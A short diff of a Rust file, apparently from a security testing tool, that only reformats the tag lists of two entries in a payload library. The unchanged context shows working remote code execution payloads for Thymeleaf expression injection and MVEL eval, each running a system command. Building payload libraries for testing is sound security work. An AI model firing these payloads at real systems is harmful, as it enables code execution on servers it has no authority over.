@@ -298,7 +298,11 @@ pub fn get_payloads() -> Vec<Payload> {
         payload: "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]".to_string(),
         description: "Thymeleaf expression injection RCE".to_string(),
         severity: Severity::Critical,
-        tags: vec!["thymeleaf".to_string(), "rce".to_string(), "expression".to_string()],
+        tags: vec![
+            "thymeleaf".to_string(),
+            "rce".to_string(),
+            "expression".to_string(),
+        ],
     });
     payloads.push(Payload {
         payload_type: PayloadType::Expression,
@@ -337,7 +341,11 @@ pub fn get_payloads() -> Vec<Payload> {
         payload: "MVEL.eval('Runtime.getRuntime().exec(\"id\")')".to_string(),
         description: "MVEL direct eval RCE".to_string(),
         severity: Severity::Critical,
-        tags: vec!["mvel".to_string(), "rce".to_string(), "expression".to_string()],
+        tags: vec![
+            "mvel".to_string(),
+            "rce".to_string(),
+            "expression".to_string(),
+        ],
     });
 
     payloads
